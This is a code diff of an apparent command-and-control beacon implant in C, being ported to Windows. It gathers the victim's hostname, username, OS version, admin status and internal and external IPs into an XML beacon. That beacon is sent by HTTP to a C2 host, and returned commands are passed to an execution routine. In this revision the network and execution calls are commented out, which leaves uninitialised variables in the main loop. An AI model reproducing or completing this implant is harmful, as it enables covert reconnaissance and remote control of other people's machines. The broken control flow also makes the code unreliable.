@@ -14,26 +14,47 @@
  *   handled directly by the beacon.
  * - sending back execution information to the C2 server.
  */
+#ifndef WIN32
+# define _GNU_SOURCE
+#endif
 
-#define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
-#include <unistd.h>
-#include <errno.h>
 #include <string.h>
-#include <libgen.h>
 
-#include <pwd.h>
-#include <sys/utsname.h>
-#include <ifaddrs.h>
+#ifdef WIN32
+# include <winsock2.h>
+# include <ws2tcpip.h>
+# include <windows.h>
+# include <iphlpapi.h>
+# pragma comment(lib, "Advapi32.lib")
+# pragma comment(lib, "iphlpapi.lib")
+# pragma comment(lib, "Ws2_32.lib")
+# pragma comment(lib, "Mincore.lib") // -lVersion
+#else
+# include <unistd.h>
+# include <errno.h>
+# include <libgen.h>
+# include <pwd.h>
+# include <sys/utsname.h>
+# include <ifaddrs.h>
+# include <arpa/inet.h>
+# include <sys/types.h>
+# include <sys/socket.h>
+# include <netdb.h>
+# include <signal.h>
+# include <wait.h>
+#endif
 
-#include <arpa/inet.h>
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <netdb.h>
-
-#include <signal.h>
-#include <wait.h>
+#ifdef WIN32
+# define SOCKET_T SOCKET
+# define SLEEP(x) Sleep(x * 1000)
+# define CLOSE(y) closesocket(y)
+#else
+# define SOCKET_T int
+# define SLEEP(x) sleep(x)
+# define CLOSE(y) close(y)
+#endif
 
 #include "beacon.h"
 #include "command.h"
@@ -48,30 +69,222 @@
 #define BEACON_RESP_MAX_SIZE 2048
 
 #define ABORT (-1)
-#define RETRY_LATER 0
-#define OK 1
+#define RETRY 0
 
+#define STD_TIMEOUT_SEC 30
 
-int timeout = 15;		// seconds
+int timeout = 30; // seconds
 
 
 /**********************************************************/
 /*                   Creating the beacon                  */
 /**********************************************************/
 
-#define MAX_IP_ENTRY_SIZE 64
+#define BEACON_MAX_SIZE 1024
+#define BEACON_FIELD_MAX_SIZE 128
+#define BEACON_MAX_IPS 10
+#define MAX_IP_ENTRY_SIZE 16
+
+static char *get_hostname()
+{
+	char *hostname = malloc(BEACON_FIELD_MAX_SIZE);
+	if (hostname == NULL)
+		return NULL;
+
+#ifdef WIN32
+	char info_buf[150];
+	DWORD buf_size = 150;
+	int i;
+	if (GetComputerNameA(info_buf, &buf_size))
+		for (i = 0; i <= buf_size; i++) // include terminating '\0'
+			hostname[i] = info_buf[i];
+	else
+		strcpy(hostname, "");
+#else
+	if (gethostname(hostname, BEACON_FIELD_MAX_SIZE) == -1)
+		strcpy(hostname, "");
+#endif
+
+	return hostname;
+}
+
+static char *get_username()
+{
+#ifdef WIN32
+	DWORD len = UNLEN + 1;
+	char *username = malloc(len);
+	if (username == NULL)
+		return NULL;
+	if (!GetUserNameA(username, &len))
+		strcpy(username, "");
+#else
+	char *username = malloc(BEACON_FIELD_MAX_SIZE);
+	if (username == NULL)
+		return NULL;
+	struct passwd *pw;
+	uid_t euid = geteuid();
+	if (pw = getpwuid(euid)) {
+		strcpy(username, pw->pw_name);
+	} else {
+		strcpy(username, "");
+	}
+#endif
+
+	return username;
+}
+
+static char *get_os()
+{
+	char *os = malloc(64); // ASCII
+	if (os == NULL)
+		return NULL;
+
+#ifdef WIN32
+	LPSTR lpszFilePath = "C:\\Windows\\System32\\kernel32.dll";
+	DWORD dwDummy;
+	DWORD dwFVISize = GetFileVersionInfoSizeA(lpszFilePath, &dwDummy);
+	if (dwFVISize == 0) {
+		printf("GetFileVersionInfoSize failed: %d\n", GetLastError());
+		strcpy(os, "");
+		return os;
+	}
+
+	LPBYTE lpVersionInfo = malloc(dwFVISize);
+	if (lpVersionInfo == NULL) {
+		strcpy(os, "");
+		return os;
+	}
+    if (!GetFileVersionInfo(lpszFilePath, 0, dwFVISize, lpVersionInfo)) {
+    	free(lpVersionInfo);
+    	printf("GetFileVersionInfo failed\n");
+    	strcpy(os, "");
+    	return os;
+    }
+    
+    UINT uLen;
+    VS_FIXEDFILEINFO *lpFfi;
+    if (!VerQueryValue(lpVersionInfo, TEXT("\\"), (LPVOID *) &lpFfi, &uLen)) {
+    	free(lpVersionInfo);
+    	printf("VerQueryValue\n");
+    	strcpy(os, "");
+    	return os;
+    }
+
+    DWORD dwFileVersionMS = lpFfi->dwProductVersionMS;
+    DWORD dwFileVersionLS = lpFfi->dwProductVersionLS;
+
+    free(lpVersionInfo);
+
+    DWORD dwLeftMost = HIWORD(dwFileVersionMS);
+    DWORD dwSecondLeft = LOWORD(dwFileVersionMS);
+    DWORD dwSecondRight = HIWORD(dwFileVersionLS);
+    DWORD dwRightMost = LOWORD(dwFileVersionLS);
+
+    sprintf(os, "%d.%d.%d.%d", dwLeftMost, dwSecondLeft,
+    	dwSecondRight, dwRightMost);
+#else
+    struct utsname utsn;
+    if (uname(&utsn) == -1) {
+		strcpy(os, "");
+	} else {
+		sprintf(os, "%s %s %s", utsn.sysname, utsn.release, utsn.machine);
+	}
+#endif
+
+    return os;
+}
+
+static char *get_admin()
+{
+	char *admin = malloc(2); // "Y/N"
+	if (admin == NULL)
+		return NULL;
+
+	int is_admin;
+
+#ifdef WIN32
+	BOOL fRet = FALSE;
+	HANDLE hToken = NULL;
+	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+		TOKEN_ELEVATION Elevation;
+		DWORD cbSize = sizeof(TOKEN_ELEVATION);
+		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
+			fRet = Elevation.TokenIsElevated;
+		}
+	}
+	if (hToken)
+		CloseHandle(hToken);
+	is_admin = (int) fRet;
+#else
+	uid_t uid = getuid();
+	uid_t euid = geteuid();
+	is_admin = (uid == 0 || euid == 0);
+#endif
+
+	sprintf(admin, "%c", (is_admin ? 'Y' : 'N'));
+	return admin;
+}
 
 static int get_ips(char *addrs[], size_t max_addrs)
 {
 	addrs[0] = NULL;
+	int n_ips = 0;
+
+#ifdef WIN32
+	PMIB_IPADDRTABLE pIPAddrTable;
+    DWORD dwSize = 0;
+    DWORD dwRetVal = 0;
+    IN_ADDR IPAddr;
+
+    pIPAddrTable = malloc(sizeof(MIB_IPADDRTABLE));
+    if (pIPAddrTable == NULL)
+    	return 0;
+
+	if (GetIpAddrTable(pIPAddrTable, &dwSize, 0) ==
+        ERROR_INSUFFICIENT_BUFFER) {
+        free(pIPAddrTable);
+        pIPAddrTable = malloc(dwSize);
+    }
+    if (pIPAddrTable == NULL) {
+        printf("[*] Memory allocation failed for GetIPAddrTable\n");
+        return 0;
+    }
+
+    if ((dwRetVal = GetIpAddrTable(pIPAddrTable, &dwSize, 0)) != NO_ERROR) {
+    	printf("[-] GetIpAddrTable failed\n");
+    	free(pIPAddrTable);
+    	return 0;
+    }
+
+    int i;
+    for (i = 0; i < (int) pIPAddrTable->dwNumEntries; i++) {
+        IPAddr.S_un.S_addr = (u_long) pIPAddrTable->table[i].dwAddr;
+        char lpszIP[MAX_IP_ENTRY_SIZE];
+        sprintf(lpszIP, inet_ntoa(IPAddr));
+        if (strncmp(lpszIP, "127", 3) == 0)
+            continue;
+
+        char *entry = malloc(MAX_IP_ENTRY_SIZE);
+        if (entry) {
+        	strcpy(entry, lpszIP);
+	        addrs[n_ips] = entry;
+	        n_ips++;
+
+	        if (n_ips > max_addrs)
+	            break;
+		}
+	}
+
+    free(pIPAddrTable);
+#else
 	struct ifaddrs *ifaddr, *ifa;
 	if (getifaddrs(&ifaddr) == -1) {
-		perror("getifaddrs");
+		printf("getifaddrs\n");
 		return 0;
 	}
 
-	int n, i = 0;
-	for (ifa = ifaddr, n = 0; ifa != NULL; ifa = ifa->ifa_next, n++) {
+	int i;
+	for (ifa = ifaddr, i = 0; ifa != NULL; ifa = ifa->ifa_next, i++) {
 		if (ifa->ifa_addr == NULL)
 			continue;
 
@@ -81,99 +294,59 @@ static int get_ips(char *addrs[], size_t max_addrs)
 					      sizeof(struct sockaddr_in),
 					      host, NI_MAXHOST,
 					      NULL, 0, NI_NUMERICHOST);
-			char *address = (ret == 0) ? host : "";
-			if (strncmp(address, "127", 3) == 0)	// skip loopback addresses
-				continue;
+			if (ret == 0) {
+				if (strncmp(host, "127", 3) == 0)	// skip loopback addresses
+					continue;
 
-			// Remove interface name
-			char *entry = malloc(MAX_IP_ENTRY_SIZE);
-			//char *interface = ifa->ifa_name;
-			//sprintf(entry, "%s@%s", address, interface);
-			sprintf(entry, "%s", address);
-			addrs[i] = entry;
-			i++;
+				char *entry = malloc(MAX_IP_ENTRY_SIZE);
+				strcpy(entry, host);
+				addrs[n_ips] = entry;
+				n_ips++;
 
-			if (i > max_addrs)
-				break;
+				if (n_ips > max_addrs)
+					break;
+			}	
 		}
 	}
+#endif
 
-	return i;
+	return n_ips;
 }
 
 /**
  * Determines whether the given IPv4 address is internal by checking its first
  * two octets. See https://en.wikipedia.org/wiki/Reserved_IP_addresses for a
  * list of private IPv4 addresses.
- *
- * Returns 1 if address is internal, 0 otherwise.
  */
-static int is_internal_ip(char *_addr)
+static int is_internal_ip(char *addr)
 {
-	int priv = 0;
-
 	int f, s, t, fo;
-	sscanf(_addr, "%u.%u.%u.%u", &f, &s, &t, &fo);
+	sscanf(addr, "%u.%u.%u.%u", &f, &s, &t, &fo);
 
-#if 0
-	/* Copy the IP address to a new buffer, because
-	   strtok modifies its argument */
-	char addr[16];
-	char *at = strchr(_addr, '@');
-	int addr_len = (int)(at - _addr);
-	strncpy(addr, _addr, addr_len);
-	addr[addr_len + 1] = '\0';
-
-	/* Get the first two octets as ints */
-	char *fp, *sp;
-	fp = strtok(addr, ".");
-	sp = strtok(NULL, ".");
-	long f = strtol(fp, NULL, 10);
-	long s = strtol(sp, NULL, 10);
-#endif
-
-	// check if IPv4 is private base on first two numbers
-	if (f == 10 || f == 127 ||
-	    (f == 100 && s >= 64 && s <= 127) ||
-	    (f == 172 && s >= 16 && s <= 31) ||
-	    (f == 169 && s == 254) || (f == 192 && s == 168))
-		priv = 1;
-
-	return priv;
+	return (f == 10 || f == 127 ||
+	       (f == 100 && s >= 64 && s <= 127) ||
+	       (f == 172 && s >= 16 && s <= 31) ||
+	       (f == 169 && s == 254) || (f == 192 && s == 168));
 }
 
 char *get_beacon(void)
 {
-#define BEACON_MAX_SIZE 1024
-#define BEACON_FIELD_MAX_SIZE 128
-#define BEACON_MAX_IPS 10
-
 	char *beacon = malloc(BEACON_MAX_SIZE);
 	if (beacon == NULL)
 		return NULL;
 
-	char *hostname = malloc(BEACON_FIELD_MAX_SIZE);
-	char *username = malloc(BEACON_FIELD_MAX_SIZE);
-	char *os = malloc(BEACON_FIELD_MAX_SIZE);
-	char admin;
+	char *hostname = get_hostname();
+	char *username = get_username();
+	char *os = get_os();
+	char *admin = get_admin();
 	char *ips[BEACON_MAX_IPS];
-	struct passwd *pw;
-	struct utsname utsn;
-	uid_t uid = getuid();
-	uid_t euid = geteuid();
-	int i, n_ips;
+	int n_ips = get_ips(ips, BEACON_MAX_IPS);
 
 	char *pos = beacon;
 	pos = append_buff(pos, "<Beacon>\n");
-	pos = append_buff(pos, "\t<Type>HEY</Type>\n");
-
-	if (gethostname(hostname, BEACON_FIELD_MAX_SIZE) == -1) {
-		//fprintf(stderr, "gethostname: %s\n", strerror(errno));
-		sprintf(hostname, "");
-	}
+	//pos = append_buff(pos, "\t<Type>HEY</Type>\n");
 	pos = append_buff(pos, "\t<HostName>%s</HostName>\n", hostname);
-
-	n_ips = get_ips(ips, BEACON_MAX_IPS);
+	int i;
 	for (i = 0; i < n_ips; i++) {
 		if (is_internal_ip(ips[i])) {
 			pos =
@@ -187,30 +360,15 @@ char *get_beacon(void)
 					ips[i]);
 		}
 	}
-
-	if (pw = getpwuid(euid)) {
-		sprintf(username, "%s", pw->pw_name);
-	} else {
-		//fprintf(stderr, "getpwuid: %s\n", strerror(errno));
-		sprintf(username, "");
-	}
 	pos = append_buff(pos, "\t<CurrentUser>%s</CurrentUser>\n", username);
-
-	if (uname(&utsn) == -1) {
-		fprintf(stderr, "uname: %s\n", strerror(errno));
-		sprintf(os, "");
-	} else {
-		sprintf(os, "%s %s %s", utsn.sysname, utsn.release, utsn.machine);	// release, version
-	}
 	pos = append_buff(pos, "\t<OS>%s</OS>\n", os);
-
-	admin = (uid == 0 || euid == 0) ? 'Y' : 'N';
-	pos = append_buff(pos, "\t<Admin>%c</Admin>\n", admin);
+	pos = append_buff(pos, "\t<Admin>%s</Admin>\n", admin);
 	pos = append_buff(pos, "</Beacon>\n", os);
 
 	free(hostname);
 	free(username);
 	free(os);
+	free(admin);
 	for (i = 0; i < n_ips; i++)
 		free(ips[i]);
 
@@ -220,7 +378,7 @@ char *get_beacon(void)
 /**********************************************************/
 /*                    Sending the beacon                  */
 /**********************************************************/
-
+#if 0
 int connect_to_c2(const char *host, int port)
 {
 	int sockfd;
@@ -707,71 +865,77 @@ static int register_sigchld_handler()
 
 	return 0;
 }
+#endif
 
 int main(int argc, char *argv[])
 {
-	printf("[*] Registering SIGCHLD handler for new process...");
-	if (register_sigchld_handler() == -1) {
-		printf(RED("failed\n"));
-		return -1;
-	}
-	printf("done\n");
+//	printf("[*] Registering SIGCHLD handler for new process...");
+//	if (register_sigchld_handler() == -1) {
+//		printf(RED("failed\n"));
+//		return -1;
+//	}
+//	printf("done\n");
 
 	printf("[*] Acquiring beacon...");
 	char *beacon = get_beacon();
 	if (beacon == NULL) {
-		printf(RED("failed\n"));
+		printf("failed\n");
 		return -1;
 	}
-	printf(GREEN("done:\n") "%s", beacon);
+	printf("done:\n%s", beacon);
 
-#define HTTP_REQ_MAX_SIZE 2048
+#define HTTP_REQ_MAX_SIZE 1024
 	printf("[*] Building HTTP request...");
 	char *http_req = malloc(HTTP_REQ_MAX_SIZE);
 	if (http_req == NULL) {
-		printf(RED("failed\n"));
+		printf("failed\n");
 		return -1;
 	}
 	sprintf(http_req, "GET /beacon/ HTTP/1.1\r\n"
 		"Host: " RHOST ":" RPORT_STR "\r\n"
 		"Content-Length: %d\r\n\r\n%s", strlen(beacon), beacon);
-	printf(GREEN("done\n"));
+	printf("done\n");
 
 	while (1) {
-		int sockfd, ret;
-		ret = connect_to_c2(RHOST, RPORT);
+		SOCKET_T sockfd;
+		int ret;
+		printf("[*] Connecting to c2 server...");
+		//ret = connect_to_c2(&sockfd, RHOST, RPORT);
 		if (ret == ABORT) {
 			/* We don't have a working socket */
+			printf("failed\n");
+			printf("[*] Terminating\n");
 			break;
-		} else if (ret == RETRY_LATER) {
+		} else if (ret == RETRY) {
 			/* We don't have a working socket */
-			sleep(timeout);
+			printf("failed\n");
+			printf("[*] Retrying soon...\n");
+			SLEEP(timeout);
 			continue;
 		}
 		/* We have a working socket */
-		sockfd = ret;
-
-		ret = send_beacon(sockfd, http_req, strlen(http_req));
+		printf("[*] Sending beacon to server:\n%s\n", http_req);
+		//ret = send_beacon(sockfd, http_req, strlen(http_req));
 		if (ret == ABORT) {
-			close(sockfd);
+			printf("[-] Error. Terminating.\n");
+			CLOSE(sockfd);
 			break;
-		} else if (ret == RETRY_LATER) {
-			close(sockfd);
-			printf(YELLOW
-			       ("[*] Sleep %d seconds before retrying..."),
-			       timeout);
-			fflush(stdout);
-			sleep(timeout);
-			printf("done\n");
+		} else if (ret == RETRY) {
+			printf("[-] Could not send beacon, will retry\n");
+			printf("[*] Closing socket\n");
+			CLOSE(sockfd);
+			printf("[*] Sleep before retrying...\n");
+			SLEEP(timeout);
 		} else {
-			char *response = get_beacon_resp(sockfd);
+			char *response;
+			//char *response = get_beacon_resp(sockfd);
 			if (response) {
 				printf("[*] Server response:\n%s\n", response);
 				printf(BLUE("[*] Preparing execution...\n"));
-				parse_and_exec(response);
-				printf(BLUE("[*] Resuming main loop\n"));
+				//parse_and_exec(response);
 				free(response);
-				sleep(timeout);
+				printf(BLUE("[*] Resuming main loop\n"));
+				SLEEP(timeout);
 			}
 		}
 	}
